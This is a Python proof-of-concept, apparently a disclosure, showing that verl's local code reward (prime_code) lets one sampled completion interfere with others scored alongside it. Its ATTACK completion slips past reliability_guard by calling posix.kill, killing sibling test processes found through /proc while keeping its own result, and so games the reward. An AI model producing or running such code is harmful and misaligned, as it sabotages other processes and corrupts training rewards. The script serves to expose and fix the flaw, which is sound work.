"""Cross-rollout interference in verl's default code reward (prime_code, local execution).

verl routes codecontests/apps/codeforces/taco to prime_code.compute_score when no
SandboxFusion URL is set. The default reward manager (naive, reward loop) scores each
sample with loop.run_in_executor and gathers them, so a group's samples are scored
concurrently, each in a multiprocessing.Process forked from the same worker, as the
same user, under reliability_guard (not a sandbox: os.kill is None, posix.kill is not).

The prime_code package is copied unmodified from verl a4e0dd2.
"""

import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor

sys.path.insert(0, sys.argv[1])
from prime_code import compute_score  # noqa: E402

TESTS = json.dumps({"inputs": [f"{i}\n" for i in range(1, 7)],
                    "outputs": [f"{2 * i}\n" for i in range(1, 7)]})

HONEST = "```python\nimport time\ntime.sleep(0.5)\nprint(int(input()) * 2)\n```"

# Stops its siblings (other samples' test processes, children of the same worker) and
# leaves alone the multiprocessing managers (they listen on a unix socket), so that its
# own result still gets recorded. Then solves the problem.
ATTACK = r'''```python
import os, posix, time
me = os.getpid()
def ppid(p):
    return open(f'/proc/{p}/stat').read().rsplit(')', 1)[1].split()[1]
def listening(p):
    inodes = set()
    for fd in os.listdir(f'/proc/{p}/fd'):
        try:
            l = os.readlink(f'/proc/{p}/fd/{fd}')
        except Exception:
            continue
        if l.startswith('socket:['):
            inodes.add(l[8:-1])
    for line in open('/proc/net/unix').read().splitlines()[1:]:
        f = line.split()
        if f[6] in inodes and f[5] == '01' and f[3] == '00010000':
            return True
    return False
parent = ppid(me)
import sys
t0 = time.time()
while not hasattr(sys, 'done') and time.time() - t0 < 4.5:
    for d in os.listdir('/proc'):
        if not d.isdigit() or int(d) == me:
            continue
        try:
            if ppid(d) == parent and not listening(d):
                posix.kill(int(d), 9)
        except Exception:
            pass
    time.sleep(0.05)
sys.done = 1
print(int(input()) * 2)
```'''


def group(completions, label):
    t = time.time()
    with ThreadPoolExecutor(len(completions)) as ex:
        futs = []
        for c in completions:
            futs.append(ex.submit(compute_score, c, TESTS, True))  # verl passes continuous=True
            time.sleep(0.2)
        res = [f.result()[0] for f in futs]
    print(f"=== {label} ({time.time() - t:.1f}s): score = {[round(float(r), 2) for r in res]}", flush=True)
    return res


if __name__ == "__main__":
    group([HONEST] * 4, "4 honest samples")
    for rep in range(3):
        group([HONEST, HONEST, HONEST, ATTACK], f"3 honest + attacker last, repeat {rep}")
    group([ATTACK, HONEST, HONEST, HONEST], "attacker first")
    group([ATTACK] + [HONEST] * 7, "attacker + 7 honest")
